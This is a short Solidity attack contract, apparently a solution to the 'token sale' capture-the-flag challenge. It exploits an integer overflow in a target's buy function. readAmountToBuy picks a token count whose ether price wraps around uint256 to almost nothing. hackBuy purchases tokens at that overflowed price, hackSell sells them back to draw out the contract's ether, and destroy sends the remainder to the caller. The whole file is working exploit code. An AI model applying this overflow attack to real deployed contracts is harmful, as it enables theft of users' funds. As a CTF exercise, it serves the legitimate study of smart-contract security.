pragma solidity ^0.4.21;

interface TokenSaleChallenge{
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
}

contract TokenSale{
    TokenSaleChallenge target;

    function setTargetContract(address _target) public{
        target = TokenSaleChallenge(_target);
    }

    function hackBuy() external{
        target.buy.value(etherRequired())(readAmountToBuy());
        // target.sell(address(target).balance);
    }

    function hackSell() external{
        // target.buy.value(etherRequired())(readAmountToBuy());
        target.sell(1);
    }



    function readAmountToBuy() public view returns(uint){
        uint val = uint(-1)/1 ether;
        return (val + 1);
    }

    function etherRequired() public view returns(uint){
        return ((readAmountToBuy()) * 1 ether);
    }

    function destroy() public{
        selfdestruct(msg.sender);
    }

    function() external payable {}
}